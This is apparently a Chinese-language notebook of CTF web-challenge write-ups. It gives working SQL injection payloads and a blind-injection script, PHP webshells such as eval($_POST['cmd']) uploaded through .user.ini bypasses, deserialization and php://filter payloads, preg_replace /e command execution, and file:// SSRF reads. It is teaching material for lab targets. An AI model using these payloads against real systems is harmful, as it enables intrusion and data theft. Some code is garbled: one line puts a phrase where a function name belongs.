                echo 'You can not get it !';
            }

        } else {
            die('only one way to get the flag');
        }
    } else {
        echo "You are not a real hacker!";
    }
} else {
    die('Please input first');

}
```

**payload：**

GET`?id[]=a&gg[]=b` POST：`passwd=1234567a`



## [极客大挑战 2019]HardSQL

### 前置知识

这题首先都空格进行了严格过滤。用户输入中不允许带有空格，在无法使用空格的情况下，则需要**多用括号**，在使用括号的过程中，==关键字不允许被括号包裹==

```sql
# or 的左右并没有空格但依然可以正常回显
mysql> select * from str_intruder where id = '1'or(1);
+----+----------+----------+
| id | username | passwd   |
+----+----------+----------+
| 1  | jake     | Aa123456 |
| 2  | Gogo     | Aa123456 |
| 3  | Peo      | Aa123456 |
| 4  | Bob      | Aa123456 |
+----+----------+----------+
4 rows in set (0.00 sec)
```

### 解题流程

**1. 确定闭合方式**

```
username=admin&password=admin'%23
```

<img src="CTF.assets/image-20230622001931287.png" alt="image-20230622001931287" style="zoom:50%;" />

**2. 爆库**

```bash
username=admin&password=admin'or(updatexml(1,concat(0x7e,(select(database()))),3))%23
```

<img src="CTF.assets/image-20230622002635692.png" alt="image-20230622002635692" style="zoom:50%;" />

**3. 爆表**

这里由于过滤了`=`，所以使用`like`关键字

```bash
username=admin&password=-1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like("geek")))),3))%23
```

<img src="CTF.assets/image-20230622002850353.png" alt="image-20230622002850353" style="zoom:50%;" />

**4. 爆字段**

由于这里的数据量比较小，所以不用指定数据表也能得到完整数据

```bash
username=admin&password=-1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_schema)like("geek")))),3))%23
```

<img src="CTF.assets/image-20230622003625827.png" alt="image-20230622003625827" style="zoom:50%;" />

**5. 拖库**

这里通过分析得到密码就是flag，但是由于这里对`substring()`或者是`substr?()`都做了过滤，查了一下，使用`left()`和`right()`函数

```bash
# 先使用left函数查出左半部分内容
username=admin&password=-1'or(updatexml(1,concat(0x7e,(select(left((group_concat(password)),30))from(H4rDsq1))),3))%23

# 再使用right函数查出右半部分内容
username=admin&password=-1'or(updatexml(1,concat(0x7e,(select(right((group_concat(password)),30))from(H4rDsq1))),3))%23

# flag：flag{ad1d3318-b81c-4db8-ad5f-48aaeefbbcb8}
```

<img src="CTF.assets/image-20230622004827285.png" alt="image-20230622004827285" style="zoom:50%;" />

## [SUCTF 2019]EasySQL

### 前置知识

```sql
# 在这条SQL语句中，MySQL会将*看为一部分（做一个查询对象），1 || password 做一列（一个查询对象），由于使用的是“||”，所以永远只会查询 || 左边的内容
mysql> select *,1 || password from user;
+----+----------+----------------------------------+---------------+
| id | username | password                         | 1 || password |
+----+----------+----------------------------------+---------------+
|  1 | admin    | e10adc3949ba59abbe56e057f20f883e |             1 |
+----+----------+----------------------------------+---------------+
1 row in set (0.00 sec)
```

### 解题流程

**1. 后台SQL语句**

看了WP才知道的后台SQL语句是这样写的

```php
$sql = "select ".$post['query']."||flag from Flag";
```

**2. payload**

结合前置知识可以知道最后的payload为：`*,1`

## [GXYCTF2019]BabyUpload

考察的是基本的文件上传绕过，这里只允许上传图片文件。尝试上传`.htaccess`

这里要将文件类型改为：`image/jpeg`，以绕过PHP的过滤

<img src="CTF.assets/image-20230706143243631.png" alt="image-20230706143243631" style="zoom:50%;" />

上传一句话木马，这里使用`script`标签绕过

<img src="CTF.assets/image-20230706143350787.png" alt="image-20230706143350787" style="zoom:50%;" />

使用蚁剑连接，这里必须要将编码器改为Base-64

<img src="CTF.assets/image-20230706143505849.png" alt="image-20230706143505849" style="zoom:50%;" />

## [GYCTF2020]Blacklist

### 前置知识

MySQL的数据查询，除了可以使用`select`方法，还有`handler`方法，此方法可以允许我们一行一行的浏览数据

```sql
mysql> handler users open;
Query OK, 0 rows affected (0.01 sec)
mysql> handler users read first;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.01 sec)

mysql> handler users read next;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  2 | Angelina | I-kill-you |
+----+----------+------------+
1 row in set (0.00 sec)

mysql> handler users read next;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  3 | Dummy    | p@ssword |
+----+----------+----------+
1 row in set (0.00 sec)

mysql> handler users close;
Query OK, 0 rows affected (0.00 sec)
```

### 解题流程

<img src="CTF.assets/image-20230706152123905.png" alt="image-20230706152123905" style="zoom:50%;" />

这里可以看到了被过滤的函数：

```
return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);
```

这里没有过滤`updatexml | extractvalue`这两个函数，理论是可以使用报错注入的，但是最后到数据的查询，依然得使用`select`关键字，所以就只能使用`handler`了

另外这里没有过滤`show`关键字，所以是可以使用堆叠注入的

#### 查看闭合方式

明显使用的是单引号闭合方法

<img src="CTF.assets/image-20230706152612645.png" alt="image-20230706152612645" style="zoom:50%;" />

#### 爆表

```
http://fe8a3b25-b05d-4623-a588-f61d6767ccaa.node4.buuoj.cn:81/?inject=2';show tables --+
```

<img src="CTF.assets/image-20230706152657052.png" alt="image-20230706152657052" style="zoom:50%;" />

#### `handler`方法查询Flag

```
http://fe8a3b25-b05d-4623-a588-f61d6767ccaa.node4.buuoj.cn:81/?inject=2';handler FlagHere open;handler FlagHere read first;--+
```

<img src="CTF.assets/image-20230706152946726.png" alt="image-20230706152946726" style="zoom: 50%;" />

## [CISCN2019 华北赛区 Day2 Web1]Hack World

### 前置知识

#### 布尔盲注

这里先复习以下布尔盲注

先查询目标第一个字母的ASCII值

```sql
# 使用 limit 过滤出第一个用户名，使用 substr 函数切割出用户名的第一个字母
mysql> select ascii(substr((select username from users limit 0,1),1,1));
+-----------------------------------------------------------+
| ascii(substr((select username from users limit 0,1),1,1)) |
+-----------------------------------------------------------+
|                                                        68 |
+-----------------------------------------------------------+
1 row in set (0.00 sec)
```

嵌套select语句做布尔判断

```bash
mysql> select (select ascii(substr((select username from users limit 0,1),1,1))) > 65;
+-------------------------------------------------------------------------+
| (select ascii(substr((select username from users limit 0,1),1,1))) > 65 |
+-------------------------------------------------------------------------+
|                                                                       1 |
+-------------------------------------------------------------------------+
1 row in set (0.00 sec)
```

#### 异或运算

==相同得0，不同得1==

```sql
mysql> select 0^0;
+-----+
| 0^0 |
+-----+
|   0 |
+-----+
1 row in set (0.00 sec)

mysql> select 0^1;
+-----+
| 0^1 |
+-----+
|   1 |
+-----+
1 row in set (0.00 sec)
```

以此配合上布尔盲注，当查询到的结果为True时，返回`1`，`0^1`依然为1

```sql
mysql> select 0^(select (select ascii(substr((select username from users limit 0,1),1,1))) > 65);
+------------------------------------------------------------------------------------+
| 0^(select (select ascii(substr((select username from users limit 0,1),1,1))) > 65) |
+------------------------------------------------------------------------------------+
|                                                                                  1 |
+------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select 1^(select (select ascii(substr((select username from users limit 0,1),1,1))) > 65);
+------------------------------------------------------------------------------------+
| 1^(select (select ascii(substr((select username from users limit 0,1),1,1))) > 65) |
+------------------------------------------------------------------------------------+
|                                                                                  0 |
+------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
```

#### 解题流程

首先这里做了基本尝试，发现做了非常严格的过滤，就连空格也被过滤了

所以这里需要使用**异或运算**来做判断

成功回显，但是这里并没有返回任何有用信息，所以可看判断出当有信息返回时，这里就会出`Hello, glzjin wants a girlfriend.`这句话，

<img src="CTF.assets/image-20230706161620420.png" alt="image-20230706161620420" style="zoom:50%;" />

尝试使用布尔盲注，由于这里对空格做了严格过滤，所以还需要使用括号来绕过

```
0^(select(select(ascii(substring((select(flag)from(flag)),1,1))))>100)
```

<img src="CTF.assets/image-20230706161746308.png" alt="image-20230706161746308" style="zoom:50%;" />

最后就是写脚本来做盲注了，源码

```py
import requests
import urllib3
import re

urllib3.disable_warnings()
flag = ""
for i in range(60):
    for asc in range(0, 129):
        payload = f"0^(select(select(ascii(substring((select(flag)from(flag)),{i},1))))={asc})"
        post_data = {
            'id': payload
        }

        req = requests.post("http://bb016411-f720-4158-ab9a-e6884d8f790b.node4.buuoj.cn:81/index.php",
                            data=post_data, verify=False).text
        if re.search("Hello, glzjin wants a girlfriend", req):
            flag += chr(asc)
            print(flag)
            break
```

<img src="CTF.assets/image-20230706173020758.png" alt="image-20230706173020758" style="zoom:50%;" />

## [picoCTF] Scavenger Hunt

### 前置知识

#### `.htaccess`文件

[`.htaccess`文件是Apache HTTP服务器的一个配置文件，它允许用户在不修改主配置文件的情况下对Web服务器的目录进行配置](https://httpd.apache.org/docs/current/howto/htaccess.html)[1](https://httpd.apache.org/docs/current/howto/htaccess.html)。虽然`.htaccess`文件主要用于Apache服务器，但也有其他Web服务器（如NGINX和Microsoft IIS）提供了对类似功能的支持，

#### `.DS_Store`

[`.DS_Store`是一种由macOS系统自动创建的隐藏文件，它存储了文件夹的自定义属性，例如文件夹视图选项、图标位置和其他视觉信息](https://en.wikipedia.org/wiki/.DS_Store)[1](https://en.wikipedia.org/wiki/.DS_Store)。它的名称是Desktop Services Store的缩写，反映了它的用途[1](https://en.wikipedia.org/wiki/.DS_Store)[。这个文件存在于每一个用「访达」打开过的文件夹下面](https://www.zhihu.com/question/20345704)[2](https://www.zhihu.com/question/20345704)

### 解题流程

根据首页的提示，可以看到线索

<img src="CTF.assets/image-20230705011434483.png" alt="image-20230705011434483" style="zoom:50%;" />

直接查看源码可以看到part1

```
<!-- Here's the first part of the flag: picoCTF{t -->
```

查看css代码可以看到part2

```
/* CSS makes the page look nice, and yes, it also has part of the flag. Here's part 2: h4ts_4_l0 */
```

查看JS代码可以看到下一个提示

```
/* How can I keep Google from indexing my website? */
```

根据提示可以快速想到robots协议，访问robots.txt

```
# Part 3: t_0f_pl4c
# I think this is an apache server... can you Access the next flag?
```

Apache网站大概率会存在的敏感文件是`.htaccess`

```
# Part 4: 3s_2_lO0k
# I love making websites on my Mac, I can Store a lot of information there.
```

阅读前置知识2可以知道要访问文件`.DS_Store`

```
Congrats! You completed the scavenger hunt. Part 5: _f7ce8828}
```

## [ZJCTF 2019]NiZhuanSiWei

### 前置知识

这题主要考的是PHP反序列化和PHP伪协议

![image-20230707161448462](CTF.assets/image-20230707161448462.png)

### 解题流程

#### 源码

```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(welcome to the zjctf($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

#### 绕过点一

首先需要使用`PHP伪协议`来控制输入流，使得`$text`读取到的内容是`welcome to the zjctf`

`file_get_contents()`是触发`PHP伪协议`的函数之一，可以搭配`data://`来输入`welcome to the zjctf`

```
payload：?text=data://text/plain,welcome to the zjctf
```

<img src="CTF.assets/image-20230708102817856.png" alt="image-20230708102817856" style="zoom:50%;" />

#### 绕过点二

`$password = unserialize($password);` 存在反序列化的可能性

` include($file);  //useless.php`这里也暗示了要包含`useless.php`

首先使用`php://filter`来读取`useless.php`源码，`include()`函数来触发`PHP伪协议`

```
payload：?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php
```

![image-20230708103258865](CTF.assets/image-20230708103258865.png)

这里得到了源码，使用的是`base64`来编码，使用PHP做解码

```php
<?php

$str = "PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=";

echo base64_decode($str);

# 输出
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

#### 绕过点三

这里的`PHP反序列`非常简单，只要保证`$file`指向的是`flag文件`就行，源码中的`echo $password;`会自动触发` __tostring()`魔术方法

```php
<?php

class Flag
{  //flag.php
    public $file = 'flag.php';

    public function __tostring()
    {
        if (isset($this->file)) {
            echo file_get_contents($this->file);
            echo "<br>";
            return ("U R SO CLOSE !///COME ON PLZ");
        }
    }
}


$f = new Flag();
echo serialize($f);

# 输出
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

#### Flag获取

最后将所有得到的结果汇总得到最后的`payload`

注意：此时`$file`需要包含的文件是`useless.php`

```
payload：?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

![image-20230708103744074](CTF.assets/image-20230708103744074.png)

```
flag{c087096a-0274-464c-a6c9-93c4d0596c2c}
```

## [BJDCTF2020]ZJCTF，不过如此

### 前置知识

#### PHP正则表达式`e`模式命令执行漏洞

##### 示例代码

```php
<?php
function complexStrtolower($regex, $value){
    return preg_replace('/('.$regex.')/ei', 'strtolower("\\1")', $value);
}

# 遍历 $_GET 数组
foreach ($_GET as $regex => $value){
    echo complexStrtolower($regex, $value)."\n";
}
```

##### `preg_replace()`函数

```bash
preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed

# 翻译成人话就是
preg_replace (正则表达式 , 替换内容 , 数据源 )
```

##### 漏洞原理

`PHP`正则`e模式`，会将匹配到的结果替换为指定内容，并将替换后的结果当代码执行

即，触发代码执行漏洞条件：

1. 数据成功被正则表达式匹配
2. 替换后的内容是正确的PHP代码

##### 爬坑一

上面的命令执行，相当于 **eval('strtolower("\\1");')** 结果，当中的 **\\1** 实际上就是 **\1** ，而 **\1** 在正则表达式中有自己的含义。我们来看看 [**W3Cschool**](https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html) 中对其的描述：

> **反向引用**
>
> 对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

这里翻译成人话就是：`$value`如果成功被正则表达式匹配到，就会放入**临时缓冲区**中，然后后续使用`\1`将`$value`取出，由于是放一个取一个，所以永远取第一个就行

```
原先的语句： preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
变成了语句： preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});
最后得到的结果：strtolower("{${phpinfo()}}");
```

以此就能达到漏洞执行的目的

##### 爬坑二

`.*`中的`.`是非法字符不能直接传到`$_GET`数组中，否则会被转义为`_*`，从而达到触发漏洞的==第一个条件：数据成功被正则表达式匹配==

所以这里可以使用`\S*`来绕过 **\S\*=${phpinfo()}**

##### 最后触发漏洞

```php
<?php
$_GET['\S*'] = "{${phpinfo()}}";
function complexStrtolower($regex, $value){
    return preg_replace('/('.$regex.')/ei', 'strtolower("\\1")', $value);
}

foreach ($_GET as $regex => $value){
    echo complexStrtolower($regex, $value)."\n";
}
# 成功执行phpinfo()
```

#### PHP复杂表达式

这个是PHP语法之一，以下写法都可成功执行

```php
<?php
echo "{${phpinfo()}}";
echo ${phpinfo()};
echo strtolower("{${phpinfo()}}");
```

### 解题流程

#### 源码

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

#### 绕过点一

首先很明显看到可以使用`file_get_contents()`函数来触发PHP伪协议，使用`data://text/plain,I have a dream`，以让PHP读到所需的值

```
payload：?text=data://text/plain,I have a dream
```

<img src="CTF.assets/image-20230708171342360.png" alt="image-20230708171342360" style="zoom:50%;" />

#### 绕过点二

`include($file);  //next.php`暗示了需要包含`next.php`，但是在这之前需要先看一`next.php`的源码

这里也可以使用`include()`函数来触发`php伪协议`来读取

```
payload：?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php
```

<img src="CTF.assets/image-20230708171639724.png" alt="image-20230708171639724" style="zoom:50%;" />

使用`base64`解码得到源码

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
        @eval($_GET['cmd']);
}
```

最后使用正则表达式`e`漏洞来执行函数`getFlag`，即可得到答案

到这里就可以根据前面的前置知识得出最后的payload了，但是值得一提的是：代码中使用`foreach`来遍历`$_GET`数组，所以最后可以传入`$_GET['\S*'] = "{${phpinfo()}}"`，至于`$id`可传可不传

```
payload：?text=data://text/plain,I have a dream&file=next.php&\S*={${getFlag()}}&cmd=system('cat /flag');
```

```
flag{d31dcaa7-5505-4bb2-ab93-feb4c5896c73}
```

## [网鼎杯 2018]Fakebook

这题考点有：php反序列化，SQL注入，CSRF

首先先注册一个账户，博客要求是一个URL

<img src="CTF.assets/image-20230709192226897.png" alt="image-20230709192226897" style="zoom:50%;" />

点击`admin`链接查看源码，可以看到源码这里将百度的`HTML`源码`base64`编码追加到末尾

![image-20230709192315729](CTF.assets/image-20230709192315729.png)

### SQL注入漏洞

且发现一个SQL漏洞注入点：`no`，输入`no=2-1`成功回显`no=1`的内容，判断出是数字型

```
payload：?no=2-1
```

<img src="CTF.assets/image-20230709192624010.png" alt="image-20230709192624010" style="zoom:50%;" />

通过`order by`判断出查询的列数是：4

```
payload：?no=1 order by 4
```

<img src="CTF.assets/image-20230709192822058.png" alt="image-20230709192822058" style="zoom:50%;" />

使用`union`联合注入可以看到回显位，且这里：`union`后面不能跟`select`，可以使用`/**/`绕过

```
payload：?no=-1 union/**/select 1,2,3,4
```

<img src="CTF.assets/image-20230709193017069.png" alt="image-20230709193017069" style="zoom:50%;" />

后面就是常规注入了，这里直接给出数据库内容：

```
数据库：fakebook
数据表：users
字段：no、username、passwd、data
no：1
username：admin
passwd：c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec
data：O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:20:"http://www.baidu.com";}
```

#### CSRF漏洞

查看`roots.txt`，可以看到一份`PHP源码`

<img src="CTF.assets/image-20230709193358195.png" alt="image-20230709193358195" style="zoom:50%;" />

```php
<?php


class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        # PHP 爬虫构造初始化
        $ch = curl_init();

        # 设置爬取目标
        curl_setopt($ch, CURLOPT_URL, $url);
        # CURLOPT_RETURNTRANSFER 表示返回HTTP状态码不返回HTTP内容
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        # 执行爬虫
        $output = curl_exec($ch);
        # 获取HTTP状态码
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if ($httpCode == 404) {
            return 404;
        }
        # 关闭资源
        curl_close($ch);

        return $output;
    }

    public function getBlogContents()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }

}
```

### 漏洞分析汇总

==这里由于在做SQL注入，导致后台无法得到应有的数据而报错==

分析网站的报错信息，尝试做反序列化，但是没有获取到数据

<img src="CTF.assets/image-20230709193531538.png" alt="image-20230709193531538" style="zoom:67%;" />

尝试调用函数`getBlogContents()`，这个函数的源码在`user.php`已给出

<img src="CTF.assets/image-20230709193607790.png" alt="image-20230709193607790" style="zoom:67%;" />

这里将信息汇总起来总结一下：

+ 后台通过查询`no`值获取数据库的内容，大概的SQL语句是：`select * from users where id = 1`

+ 注意观察到`data`字段是一串序列化字符串，那么可以猜测出后台是通过获取`data`的信息，再做反序列化得到用户的信息，也就是这里的内容

  <img src="CTF.assets/image-20230709193944886.png" alt="image-20230709193944886" style="zoom:50%;" />

+ 反序列字符串中的`blog`内容是我们填写的网站，并且调用的回调函数是：`getBlogContents()`，这里允许输入一个`URL`，且没做任何的过滤，存在`CSRF`漏洞，另外，PHP的`curl`是可以访问`PHP伪协议`获取到的内容的，但是只能获取到`file://`而不能得到`filter://`的，这里可以看一下试验

  

  试验源码：

  ```php
  <?php
  $url = $_GET['url'];
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  $output = curl_exec($ch);
  var_dump($output);
  curl_close($ch);
  ```



​     `filter://`读不到，返回`False`

​    <img src="CTF.assets/image-20230709195252474.png" alt="image-20230709195252474" style="zoom:67%;" />

​    `file://`成功读取内容并返回信息

​    <img src="CTF.assets/image-20230709195338015.png" alt="image-20230709195338015" style="zoom:67%;" />



### `payload`构造

首先尝试将反序列化字符串通过`union`注入提交到`PHP`后台，发现依然可以成功解析，记得给反序列字符串加上单引号

```
payload：?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:20:"http://www.baidu.com";}'
```

<img src="CTF.assets/image-20230709195704346.png" alt="image-20230709195704346" style="zoom:50%;" />

对反序列化的内容进行修改，依然可以成功识别

<img src="CTF.assets/image-20230709195730325.png" alt="image-20230709195730325" style="zoom:50%;" />

使用`PHP伪协议`读取FLAG

```
payload：?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:15;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

<img src="CTF.assets/image-20230709195848702.png" alt="image-20230709195848702" style="zoom:50%;" />

查看源码

<img src="CTF.assets/image-20230709195910078.png" alt="image-20230709195910078" style="zoom:50%;" />

将数据使用`base64`解码

<img src="CTF.assets/image-20230709195957119.png" alt="image-20230709195957119" style="zoom:50%;" />

```
flag：flag{7e8d8715-6120-4ec3-9f91-e85469922fc7}
```

## [攻防世界] easyupload

一开始上传了各种文件上去都不行，哪怕将文件的后缀名于`IMIE`类型都改为图片类型都不行，以此猜测到还对文件头进行过滤

需要绕过的点如下

- 检查文件内容是否有php字符串
- 检查后缀中是否有htaccess或ph
- 检查文件头部信息
- 文件MIME类型

先上传`user.ini`文件并修改文件类型，该文件的详细描述在 ---> 橙子科技

由于对文件头做了过滤，所以这里必须附带上`GIF89a`

作用：在加载同一目录下的PHP文件时，会先将`.user.ini`文件的内容加载到PHP配置文件`php.ini`，并执行`php.ini`文件的内容，`auto_prepend_file`加载到文件头将文件`GIF89a.jpg`当作PHP文件来执行

```
# .user.ini
GIF89a
auto_prepend_file=GIF89a.jpg
```



<img src="CTF.assets/image-20230709230315351.png" alt="image-20230709230315351" style="zoom:50%;" />

上传木马：注意修改后缀名和文件类型

```
GIF89a
<?=eval($_POST['cmd']);?>
```



<img src="CTF.assets/image-20230709230735067.png" alt="image-20230709230735067" style="zoom:50%;" />

要激活`.user.ini`需要先放同一目录（uploads）的PHP文件

蚁剑连接

<img src="CTF.assets/image-20230709230830785.png" alt="image-20230709230830785" style="zoom:50%;" />

## [BJDCTF2020]The mystery of ip

这题考察的是PHP的Smart模板注入

进去首先先查看提示：Hint.php

![image-20230831212107084](CTF.assets/image-20230831212107084.png)

这里可以看到提示我们可以使用HTTP字段：`X-Forwarded-For`，使用Hack bar修改头部

<img src="CTF.assets/image-20230831212254355.png" alt="image-20230831212254355" style="zoom:50%;" />

这里可以怀疑后台对于：`X-Forwarded-For`传入的值没有任何的安全过滤，那么可以尝试一些payload来触发漏洞

<img src="CTF.assets/image-20230831212502591.png" alt="image-20230831212502591" style="zoom:67%;" />

![image-20230902184611487](CTF.assets/image-20230902184611487.png)

<img src="CTF.assets/image-20230831212556260.png" alt="image-20230831212556260" style="zoom:67%;" />

根据报错提示，可以确定这里使用的是Smarty模板

<img src="CTF.assets/image-20230831212635498.png" alt="image-20230831212635498" style="zoom:50%;" />

成功得到Flag

## [SUCTF 2019]CheckIn

进入网站，一个文件上传口

![image-20230901143252820](CTF.assets/image-20230901143252820.png)

使用插件查看，发现用的是Nginx服务器，那么或许可以上传`.user.ini`配置文件

<img src="CTF.assets/image-20230901143344819.png" alt="image-20230901143344819" style="zoom:67%;" />

尝试上传最普通的一句话木马

![image-20230901144628731](CTF.assets/image-20230901144628731.png)

发现对`<?`进行了严格过滤，所以这里只能用`script`标签的一句话木马：`<script language="php">eval($_POST['cmd']);</script>`

这里显示，要求上传一张图片，使用BP来修改文件类型绕过，并添加GIF89a文件头

![image-20230901144740530](CTF.assets/image-20230901144740530.png)

上传成功：

```
GIF89a
<script language="php">eval($_POST['cmd']);</script>
```

![image-20230901144954034](CTF.assets/image-20230901144954034.png)

到这一步，虽然已经成功上传了木马上去，但是由于后缀不是PHP文件，所以无法执行。那么这里还需要上传一个`.user.ini`文件上去（依旧注意要修改文件类型和添加GIF89a头）

![image-20230901145414887](CTF.assets/image-20230901145414887.png)

最后使用蚁剑连接即可

**顺序应该是：先上传`.user.ini`再上传木马文件**

## [BSidesCF 2020]Had a bad day

进来读源码，发现使用Form表单的GET提交参数，来确定前端要返回的图片

<img src="CTF.assets/image-20230901172246997.png" alt="image-20230901172246997" style="zoom:50%;" />

加一个单引号试一下，可以看到`include`函数报错，那么就可以确定是文件包含了

<img src="CTF.assets/image-20230901172330677.png" alt="image-20230901172330677" style="zoom:50%;" />

尝试使用`php://filter`包含`index.php`，这里注意报错，**后台会在上传的字符串中自动追加PHP，所以直接传入index即可**

```
php://filter/read=convert.base64-encode/resource=index
```

<img src="CTF.assets/image-20230901172815113.png" alt="image-20230901172815113" style="zoom:67%;" />

得到源码如下：

```php
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="Images that spark joy">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Had a bad day?</title>
    <link rel="stylesheet" href="css/material.min.css">
    <link rel="stylesheet" href="css/style.css">
  </head>
  <body>
    <div class="page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100">
      <header class="page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Had a bad day?</span>
          <div class="mdl-layout-spacer"></div>
        <div>
      </header>
      <div class="page-ribbon"></div>
      <main class="page-main mdl-layout__content">
        <div class="page-container mdl-grid">
          <div class="mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone"></div>
          <div class="page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col">
            <div class="page-crumbs mdl-color-text--grey-500">
            </div>
            <h3>Cheer up!</h3>
              <p>
                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!
              </p>
              <div class="page-include">
              <?php
				$file = $_GET['category'];
				# 这里要求传入的字符串中必须带有：woofers、meowers且index不能位于首位
				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
			</div>
          <form action="index.php" method="get" id="choice">
              <center><button onclick="document.getElementById('choice').submit();" name="category" value="woofers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Woofers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button>
              <button onclick="document.getElementById('choice').submit();" name="category" value="meowers" class="mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect" data-upgraded=",MaterialButton,MaterialRipple">Meowers<span class="mdl-button__ripple-container"><span class="mdl-ripple is-animating" style="width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);"></span></span></button></center>
          </form>

          </div>
        </div>
      </main>
    </div>
    <script src="js/material.min.js"></script>
  </body>
</html>
```

最后payload

```
php://filter/read=convert.base64-encode/resource=woofers/../flag
```

这里解释一下`woofers/../flag`，将`woofers`当作一个文件夹，然后进去再退出来找`flag.php` == 找当前文件夹下的flag.php

## 攻防世界 unseping

考点：PHP反序列化

```php
<?php
highlight_file(__FILE__);

class ease{
    
    private $method;
    # 要执行的系统命令
    private $args;
    function __construct($method, $args) {
        $this->method = $method;
        $this->args = $args;
    }
 
    function __destruct(){
        # 要求 method="ping"
        if (in_array($this->method, array("ping"))) {
            # 两个参数都必须为数组
